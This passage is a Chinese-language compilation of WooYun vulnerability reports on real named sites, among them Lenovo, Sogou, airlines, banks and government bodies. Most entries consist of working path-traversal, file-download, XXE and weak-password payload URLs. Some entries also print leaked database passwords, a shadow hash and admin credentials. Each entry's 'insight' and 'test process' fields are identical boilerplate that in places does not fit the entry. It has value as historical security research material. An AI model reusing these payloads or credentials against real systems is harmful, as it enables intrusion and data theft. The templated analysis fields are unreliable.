**厂商**: 联想 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 上传功能

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 问题站点是联想开发社区：http://developer.lenovomm.com/1.注册一个用户，看见有个上传新应用；2.我就不相信你们一个错误只犯一次，果不其然,提交以下请求；http://developer.lenovomm.com/windev/ReadImageServlet?path=../../../etc/passwd3.我们点击右键另存为，将图片下载下来打开，look；

**POC**: 见详细说明

**绕过**: 直接利用

**修复**: 你们懂的
---

---
### [wooyun-2014-039736] 河北新闻网某系统任意文件读取漏洞
**厂商**: 河北新闻门户网站 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件读取http://ids.hebei.com.cn/ids/admin/debug/fv.jsp?f=/../../../../../../etc/shadow信息泄露http://ids.hebei.com.cn/ids/admin/debug/env.jsp

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 删~~~
---

---
### [wooyun-2015-0146094] 某市水务局目录遍历敏感信息泄漏
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞点http://**.**.**.**/swj/kjfw/news/kyyydw/dwFrame.jsp?type=/WEB-INF/web.xml这个网站做了一点防护，过滤了常见危险字符，但没有对WEB-INF目录做限制

**POC**: web.xml信息，应该是对了一点配置，可用信息不多，但applicationContext.xmlSqlMapConfig.xmldb.propertiesdrivers=oracle.jdbc.driver.OracleDriver#url=jdbc:oracle:thin:@localhost:1521:shwaterurl=jdbc:oracle:thin:@**.**.**.**:1521:shwateruser=newwaterpassword=2ws3ed4rftime=16

**绕过**: 直接利用

**修复**: WEB-INF权限控制
---

---
### [wooyun-2016-0171322] 厦门航空客服系统任意文件下载漏洞
**厂商**: xiamenair.com | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 客服系统存在任意文件下载漏洞，访问http://ocs.xiamenair.com.cn/live800/downlog.jsp?path=/&fileName=/etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-071907] 搜狗浏览器疑似上传用户访问记录
**厂商**: 搜狗 | **年份**: 2014 | **类型**: 用户敏感数据泄漏

**元思考**: 触发信号: 功能测试

**洞察**: 用户敏感数据泄漏防护不足，开发者信任前端输入

**测试流程**:
1. 识别用户敏感数据泄漏相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 看截图。他到底发了什么包可以看到，搜狗自动向他们服务器提交了数据，提交的内容，就是我访问的内内容 比方说 有这个：/discover_agent?h=02284EF5A7C77138794D9EE7B0180002&cmd=get_site_info&all=http%3A%2F%2Fwww.wooyun.org%2Fbugs%2Fwooyun-2010-028832%40%40%40http%3A%2F%2Fwww.wooyun.org%2Fbugs%2Fwooyun-2010-028832&token=auto&_=1407718548940 HTTP/1.1Host: discover.ie.sogou.com还有这个：/websearch/features/yun4.jsp?pid=sogou-brse-596dedf4498e258e&w=1366&v=1425&st=14077

**POC**: 如上。至少我用火狐和谷歌不会这么做。

**绕过**: 直接利用

**修复**: 。。。
---

---
### [wooyun-2014-081249] 龙华共产党员网一处任意文件下载导致短信测试接口暴露(可向任意手机号发送短信)
**厂商**: cncert国家互联网应急中心 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 首先是任意文件下载构造好要下载的文件web.config如下http://www.lhgcdy.gov.cn/public/down.aspx?filename=web.config&filepath=web.config下载web.config起初是奔着数据库去的，但是数据库还没来得及看就看到了下面这个东西咦，这是什么东西，赶快进去看看一眼就瞄到了短信接口，点开看看然后用图1中的ID和PWD做用户名和密码，填好发送号码(经测试，这个号码不是自己填写的，会自己变动)，填好接受号码，填好发送内容，点击发送过一会儿短信就过来了。

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0124501] 元富理財網某系统存在任意文件下载漏洞
**厂商**: 元富理財網 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 台湾元富理財網繁体版本http://www.masterlink.com.tw简体版本http://www.masterlink.com.tw:2480漏洞地址：DownloadFile.aspx?filename=../web.config&tableName=Download&serialNo=2286即：http://www.masterlink.com.tw/DownloadFile.aspx?filename=../web.config&tableName=Download&serialNo=2286

**POC**: 简体版本http://www.masterlink.com.tw:2480/DownloadFile.aspx?filename=../web.config&tableName=Download&serialNo=2286

**绕过**: 直接利用

**修复**: 过滤../
---

---
### [wooyun-2015-094441] 浙江省地方税务局文件读取漏洞
**厂商**: 浙江省地方税务局 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞地址：http://xxgk.zjds.gov.cn/jcms/jcms_files/jcms1/web1/site/module/oss/downfile.jsp?filename=a.txt&pathfile=media/-1/....//....//module/oss/downfile.jsp

**POC**: 漏洞截图：

**绕过**: 直接利用

**修复**: 限制文件下载。
---

---
### [wooyun-2015-0108276] 易达物流宝网站任意文件下载漏洞
**厂商**: 易达物流宝 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 易达物流宝网站任意文件下载漏洞

**POC**: http://61.153.100.214/download?dir=xtxz&fileName=../../../../../../../etc/passwd

**绕过**: 直接利用

**修复**: 参数中不允许出现../之类的目录跳转符
---

---
### [wooyun-2015-0153060] 上海交通委员会邮箱弱口令及任意文件下载
**厂商**: 上海交通委员会 | **年份**: 2015 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://**.**.**.**/top500姓名爆破，密码：123456wangwei/123456lixiaohong/123456

**POC**: 任意文件下载http://**.**.**.**/file.php?Cmd=download&filename=../../../../../../etc/passwd&path=# $FreeBSD: src/etc/master.passwd,v 1.39 2004/08/01 21:33:47 markm Exp $#root:*:0:0:Charlie &:/root:/bin/cshtoor:*:0:0:Bourne-again Superuser:/root:daemon:*:1:1:Owner of many system processes:/root:/usr/sbin/no

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0102661] 长虹智能电视开放平台wiki弱口令
**厂商**: changhong.com | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、	smart_tv的wiki弱口令：Admin/changhonghttp://wiki.smart-tv.cn/index.php2、智能电视应用开发者平台目录遍历：智控http://open.smart-tv.cn/chzk/不少信息：是否有影响？

**POC**: 如上

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0135091] 东方证券官网任意文件读取
**厂商**: 东方证券 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.dfzq.com.cn/ubsiServlet?xml=<!DOCTYPE foo [<!ENTITY  xxe SYSTEM "file:///etc/passwd">]><ubsi service="service" method="method"><object type="Integer">%26xxe;</object></ubsi><object type="null" /><!-- 解析输入XML错误，java.lang.NumberFormatException: For input string: "root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/s

**POC**: (见原文)

**绕过**: 直接利用

**修复**: xml禁止读任意文件
---

---
### [wooyun-2013-045553] 玉柴机器集团邮件服务器任意文件读取漏洞
**厂商**: 玉柴机器集团有限公司(国有) | **年份**: 2013 | **类型**: 敏感信息泄露

**元思考**: 触发信号: 认证接口

**洞察**: 敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 2013年12月6日，exploit-db披露了一个Zimbra邮件服务端的本地文件包含漏洞邮件系统:smtp.yuchaihi.com管理员登陆地址:https://smtp.yuchaihi.com:7071/zimbraAdmin/

**POC**: exp成功执行管理员登陆地址添加管理员用户大量人员名单，内部邮箱泄露

**绕过**: 直接利用

**修复**: 及时打补丁
---

---
### [wooyun-2014-084970] it168分站诸多漏洞打包
**厂商**: IT168.com | **年份**: 2014 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1.网站结构敏感信息泄露http://benyouhui.it168.com/xml  下载后，打开如下：根目录：Api目录Config目录可以看到文件结构。。2.列目录http://my.solution.it168.com/image/_svn/tmp/还有其他的。不一一列出。。3.备份文件下载http://benyouhui.it168.com/lepad/lepad.ziphttp://benyouhui.it168.com/beauty.zip还有一个：http://benyouhui.it168.com/root.txt这是啥，root密码？

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 自行修补。
---

---
### [wooyun-2013-033114] 帝友P2P借贷系统任意文件读取漏洞
**厂商**: 厦门帝网信息科技有限公司 | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 使用这套系统的网站后面加上index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA==就可以爆出数据库的相关信息

**POC**: 已经测试了如下几个站，都可以使用此漏洞请用IE浏览器打开此链接http://www.dingxindai.com/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA==http://www.etongdai.com/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21tb24uaW5jLnBocA==http://www.5aitou.com/index.php?plugins&q=imgurl&url=QGltZ3VybEAvY29yZS9jb21t

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2014-049111] CNTV某后台目录遍历与弱口令漏洞
**厂商**: 中国网络电视台 | **年份**: 2014 | **类型**: 后台弱口令

**元思考**: 触发信号: 后台管理

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://202.108.16.194/ 存在目录遍历漏洞。随便翻了下找到一个后台：http://202.108.16.194/cntv_news/index.php存在弱口令 admin admin是个评论管理后台？

**POC**: 目录遍历：成功登录后台：

**绕过**: 直接利用

**修复**: 配置webserver然后修改弱口令吧。
---

---
### [wooyun-2016-0198786] 海南航空某站JAVA安全模式绕过任意文件读取(平台账号密码/数据库配置信息/多款秘钥)
**厂商**: hnair.com | **年份**: 2016 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 直接访问javaweb配置文件不存在 加子域名前缀不存在 %c0%ae   进行绕过  J2EE安全漏洞遇到各种猜测不到的可加此路径进行测试

**POC**: (见原文)

**绕过**: 过滤绕过

**修复**: 加强输入验证
---

---
### [wooyun-2013-020255] 07073游戏官网任意文件读取漏洞
**厂商**: 07073.com | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 

**POC**: 漏洞文件：http://www.07073.com/plus/view.php?aid=398928

**绕过**: 直接利用

**修复**: 。。
---

---
### [wooyun-2015-089898] 天津神州浩天高校网上银行收费系统任意文件下载漏洞
**厂商**: 天津神州浩天科技有限公司 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://sfpt.tjufe.edu.cn/admin/down.aspx?type=notice&mc=../../../web.confighttp://202.201.166.131/wsyh/admin/down.aspx?type=notice&mc=../../../web.confighttp://218.199.196.90/admin/down.aspx?type=notice&mc=../../../web.confighttp://fin.hrbnu.edu.cn/wysf/admin/down.aspx?type=notice&mc=../../../web.confighttp://218.104.195.23/wsyh/admin/down.aspx?type=notice&mc=../../../web.confighttp://jf.cqwu.net/

**POC**: curl 'http://jf.cqwu.net/admin/down.aspx?type=notice&mc=../../../web.config'<?xml version="1.0"?><!--注意: 除了手动编辑此文件以外，您还可以使用Web 管理工具来配置应用程序的设置。可以使用 Visual Studio 中的“网站”->“Asp.Net 配置”选项。设置和注释的完整列表在machine.config.comments 中，该文件通常位于\Windows\Microsoft.Net\Framework\v2.x\Config 中--><configuration><configS

**绕过**: 直接利用

**修复**: 过滤特殊符合现在下载文件名，以及限制跨目录
---

---
### [wooyun-2014-073109] 奇艺某站目录遍历(泄露部分sql)
**厂商**: 奇艺 | **年份**: 2014 | **类型**: 未授权访问/权限绕过

**元思考**: 触发信号: 功能测试

**洞察**: 未授权访问/权限绕过防护不足，开发者信任前端输入

**测试流程**:
1. 识别未授权访问/权限绕过相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1：多处遍历目录http://au.iqiyi.com/public/http://au.iqiyi.com/conf/不列举了，其他你们修复就好2：爆绝对路径http://au.iqiyi.com/conf/appconfig.php3:泄露部分sql信息http://au.iqiyi.com/lib/Service/SecKill/seckill.sql4:http://au.iqiyi.com/index.php?m=Login&a=login&type='

**POC**: 1：多处遍历目录http://au.iqiyi.com/public/http://au.iqiyi.com/conf/不列举了，其他你们修复就好2：爆绝对路径http://au.iqiyi.com/conf/appconfig.php3:泄露部分sql信息http://au.iqiyi.com/lib/Service/SecKill/seckill.sql4:http://au.iqiyi.com/index.php?m=Login&a=login&type='发现有 phpmyadmin,没尝试爆破，就到这里吧

**绕过**: 直接利用

**修复**: 你们专业的
---

---
### [wooyun-2011-01934] Honeywall后台管理界面存在任意文件读取漏洞
**厂商**: The Honeynet Project | **年份**: 2011 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: admin/docs.pl 对于 POST的file检查不严。可以自己构造post包来读取任意文件。

**POC**: http://xxx.xxx.xxx/admin/docs.plPOST-content:act=16&file=../../../../../../../../etc/issue&submit=Submit

**绕过**: 直接利用

**修复**: 闹太套
---

---
### [wooyun-2014-082045] 太平保险某站点任意文件下载
**厂商**: 中国太平保险 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: WooYun: 太平保险某站点任意文件读取(二)漏洞未修好，可以下载任意php文件。http://www.hk.cntaiping.com/include/getfile.php?filepath=include/&file=config.php&filename=1<?php	// db config/*$db_host['main'] = "web1.creasant.com";$db_user['main'] = "temp_mingan";$db_pwd['main'] =  "b4rfVCb9";$db_name['main'] = "temp_mingan";*/// db config$db_host['main'] = "localhost";$db_user['main'] = "joseph";$db_pwd['main'] =  "creasant";$db_name

**POC**: http://www.hk.cntaiping.com/include/getfile.php?filepath=include/&file=config.php&filename=1<code><?php	// db config/*$db_host['main'] = "web1.creasant.com";$d

**绕过**: 直接利用

**修复**: 过滤参数filepath、file
---

---
### [wooyun-2014-061399] 国内某开源OA系统任意文件下载漏洞
**厂商**: PHPOA | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 该网站提供的OA系统为开源系统所以根据源码可看到其过滤并不严谨！能利用 “../”轻松绕过

**POC**: 漏洞证明：

**绕过**: 过滤绕过

**修复**: 建议网盘路径方面的存储数据库保险些！
---

---
### [wooyun-2015-096317] 厦门市工业经济网多个子站ewebeditor编辑器弱口令
**厂商**: cncert国家互联网应急中心 | **年份**: 2015 | **类型**: 后台弱口令

**元思考**: 触发信号: 功能测试

**洞察**: 后台弱口令防护不足，开发者信任前端输入

**测试流程**:
1. 识别后台弱口令相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 1、ewebeditor编辑器弱口令导致的目录遍历、任意文件删除等问题2、ckeditor编辑器未授权访问导致的任意文件删除（服务器有安全狗）eweb编辑器弱口令（admin/admin）涉及子站包括：http://www.xmit.gov.cn/report/eWeb/admin_default.asp（即http://xmjfw.xmsme.gov.cn/report/eWeb/admin_login.asp）http://m.xmjfw.xmsme.gov.cn/eweb/admin_login.asphttp://v.xmjfw.xmsme.gov.cn/live/manage/bk/eWebEditor/admin_default.aspckeditor未授权访问：http://manage.xmjfw.xmsme.gov.cn/finder/ckfinder.html删除页面与

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 更改口令ckeditor加授权访问
---

---
### [wooyun-2015-0110640] ChinaCache某两台服务器任意文件读取
**厂商**: ChinaCache | **年份**: 2015 | **类型**: 重要敏感信息泄露

**元思考**: 触发信号: 功能测试

**洞察**: 重要敏感信息泄露防护不足，开发者信任前端输入

**测试流程**:
1. 识别重要敏感信息泄露相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 需要使用一些请求工具，直接浏览器访问不可以http://42.62.25.197/../../../../../../../../../../../../../../../../../etc/hostshttp://42.62.25.196/../../../../../../../../../../../../../../../../../etc/hostsroot权限：http://42.62.25.197/../../../../../../../../../../../../../../../../../etc/shadowroot:$1$WdIfTFIg$2ZvTRs6FKd7c8lZU0g5Bt/:16341:0:99999:7:::bin:*:16315:0:99999:7:::daemon:*:16315:0:99999:7:::adm:*:16315:0:99999:7:

**POC**: http://42.62.25.196/../../../../../../../../../../../../../../../../../usr/local/ccms/origin/etc/ccms_origin.conf

**绕过**: 直接利用

**修复**: 修改配置
---

---
### [wooyun-2014-075215] 中国电信小礼包
**厂商**: 中国电信 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: #目标一:四川省电信工程实施管理系统 （C网基站/FTTX工程管理系统）#网址:http://118.123.221.150/#问题：phpinfo            http://118.123.221.150/info.phpupload目录遍历   http://118.123.221.150https://wooyun-img.oss-cn-beijing.aliyuncs.com/upload/  (里面文件太多，请谨慎打开，容易卡爆了) 有很多应该是绝密的信息，四川各个地方的基站配置安装等等等等。。backup目录遍历  http://118.123.221.150/backup/其中  http://118.123.221.150/backup/backup.cmd爆出了数据库类型数据库名称路径账户密码oracle数据库，账户analyzer密码mary050115800

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 你们更懂
---

---
### [wooyun-2014-086115] 中国电信某省主站任意文件读取
**厂商**: 中国电信 | **年份**: 2014 | **类型**: 文件包含

**元思考**: 触发信号: 功能测试

**洞察**: 文件包含防护不足，开发者信任前端输入

**测试流程**:
1. 识别文件包含相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://gx.189.cn/%c0%ae/WEB-INF/web.xml

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2013-024499] pptv官方任意文件下载漏洞
**厂商**: PPTV(PPlive) | **年份**: 2013 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: pptv官方任意文件下载

**POC**: 来到pps指数。点击下载。右键查看属性地址。下载的文件。改文件名。下载一下吧。得到的文件。可以下载任意的文件。

**绕过**: 直接利用

**修复**: 你们更专用。
---

---
### [wooyun-2014-057717] 正义网直播备份文件下载
**厂商**: 正义网 | **年份**: 2014 | **类型**: 系统/服务运维配置不当

**元思考**: 触发信号: 功能测试

**洞察**: 系统/服务运维配置不当防护不足，开发者信任前端输入

**测试流程**:
1. 识别系统/服务运维配置不当相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 正义网直播管理员意识不足 导致备份文件下载 管理员意识太差咯

**POC**: http://live.jcrb.com/web.rar

**绕过**: 直接利用

**修复**: 这么简单我就不说了
---

---
### [wooyun-2014-055663] 四川航空主站任意文件下载
**厂商**: 四川航空 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.scal.com.cn/Scal.WebMaster/News/Accessory/FileDownL.aspx?lins=/&name=./web.confighttp://www.scal.com.cn/Scal.WebMaster/News/Accessory/FileDownL.aspx?lins=/&name=./App_Data/Config.xmlhttp://www.scal.com.cn/Scal.WebMaster/News/Accessory/FileDownL.aspx?lins=/&name=./App_Data/DbConn.xml

**POC**: http://www.scal.com.cn/Scal.WebMaster/News/Accessory/FileDownL.aspx?lins=/&name=./web.confighttp://www.scal.com.cn/Scal.WebMaster/News/Accessory/FileDownL.aspx?lins=/&name=./App_Data/Config.xmlhttp://www.scal.com.cn/Scal.WebMaster/News/Accessory/FileDownL.aspx?lins=/&name=./App_Data/DbConn.xml

**绕过**: 直接利用

**修复**: 把路径写死就行了.或者自行过滤用户可控的参数.
---

---
### [wooyun-2014-072549] 某OA任意文件下载（demo测试）
**厂商**: 易捷 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 认证接口

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 易捷OA任意文件下载漏洞官网地址：http://www.yijieoa.comdemo：http://www.yijieoa.com/news/Website/shtml/T-8.htm?id=2点击：http://42.62.65.147:8089/不需要登录直接访问：例如访问：http://42.62.65.147:8089/servlet/ShowPic?filePath=/tomcat/webapps/ROOT/WEB-INF/web.xml

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 过滤
---

---
### [wooyun-2015-0121133] 搜狗某站任意文件读取
**厂商**: 搜狗 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 文件读取 没什么好说的http://shoujitest.shouji.sogou.com/log.php?see=../../../../../../../../../../../../etc/passwdhttp://shoujitest.shouji.sogou.com/log.php?see=../../../../../../../../../../../../etc/httpd/conf/httpd.conf就不翻history了

**POC**: root:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/sbin:/bin/syncshutdown:x:6:0:shutdown:/sbin:/sbin/shutdownhalt:x:7:0:halt:/sbin:/sbin/haltmail:x:8:12:mai

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2014-074848] 擎天科技SKYWCM V3.2 任意文件下载漏洞
**厂商**: 南京擎天科技 | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: POC：http://www.xxx.com/skywcm/webpage/download.jsp?absolutePath=C:%5Cboot.ini&downFileName=boot.inihttp://www.njsports.gov.cn/skywcm/webpage/download.jsp?absolutePath=C:%5Cboot.ini&downFileName=boot.ini漏洞发生在download.jsp中，指定文件的绝对路径和文件名就可以下载该文件

**POC**: 擎天科技官网也存在这个问题,这个文件就是官网的服务上的

**绕过**: 直接利用

**修复**: 不知道这个downlaod.jsp存在的意义是啥，不如直接去掉好了
---

---
### [wooyun-2016-0200101] 同花顺某分站任意文件读取漏洞
**厂商**: 同花顺 | **年份**: 2016 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 根据下面的漏洞，衍生绕过WooYun: 同花顺某站点文件包含漏洞访问下面的连接提示无数据http://vaserviece.10jqka.com.cn/mobilecfxf/contenajax.php?path=test.txt请求passwd，无响应http://vaserviece.10jqka.com.cn/mobilecfxf/contenajax.php?path=/etc/passwd判断可能判断了文件名里面是否包含.txt

**POC**: 绕过，读取到了文件http://vaserviece.10jqka.com.cn/mobilecfxf/contenajax.php?path=/etc/passwd.txt/../../etc/passwdroot:x:0:0:root:/root:/bin/bashbin:x:1:1:bin:/bin:/sbin/nologindaemon:x:2:2:daemon:/sbin:/sbin/nologinadm:x:3:4:adm:/var/adm:/sbin/nologinlp:x:4:7:lp:/var/spool/lpd:/sbin/nologinsync:x:5:0:sync:/s

**绕过**: 过滤绕过

**修复**: 过滤得严格一点把
---

---
### [wooyun-2014-048518] 为课网校某站Padding Oracle任意文件读取漏洞
**厂商**: weekedu.com | **年份**: 2014 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: 漏洞在主站！！！http://www.weekedu.com/随便找个链接，比如http://www.weekedu.com/web_Org/New_Info.aspx?infoid=3397&typeid=4021查看源码

**POC**: padBuster.pl http://www.weekedu.com/WebResource.axd?d=baZ0_4F3gzitRbVLl1ne1w2 baZ0_4F3gzitRbVLl1ne1w2 16 -encoding 3 -plaintext "|||~web.config"有点慢，跑了十几分钟没出来就算了，不继续跑了反正问题存在就好

**绕过**: 直接利用

**修复**: 升级或者打补丁或者你们懂得
---

---
### [wooyun-2015-0140090] 蚌埠农村商业银行某处任意文件下载
**厂商**: 蚌埠农村商业银行 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://www.bbrcb.cn:7001/defaultroot/public/jsp/download.jsp?FileName=mailserver.properties&name=2.jsp&path=/../../config/http://www.bbrcb.cn:7001/defaultroot/public/jsp/download.jsp?FileName=config.xml&name=govexchange.properties&path=/../../config/http://www.bbrcb.cn:7001/defaultroot/public/jsp/download.jsp?FileName=config.xml&name=2.jsp&path=/../../config/http://www.bbrcb.cn:7001/defaultroot/pu

**POC**: 如上

**绕过**: 直接利用

**修复**: 更新版本
---

---
### [wooyun-2015-0116437] 波奇网某站存在任意文件读取漏洞
**厂商**: 波奇网 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

**洞察**: 任意文件遍历/下载防护不足，开发者信任前端输入

**测试流程**:
1. 识别任意文件遍历/下载相关功能
2. 构造测试Payload
3. 验证漏洞响应

**详情**: http://v.boqii.com/vetapi.php?UDID=123&url=file:///etc/passwd

**POC**: (见原文)

**绕过**: 直接利用

**修复**: 加强输入验证
---

---
### [wooyun-2015-0122808] 某市人事考试网漏洞可导致上万人考试信息泄露&被挂黑链洗浴按摩全套-第二弹
**厂商**: 人事局考试指导服务中心 | **年份**: 2015 | **类型**: 任意文件遍历/下载

**元思考**: 触发信号: 功能测试

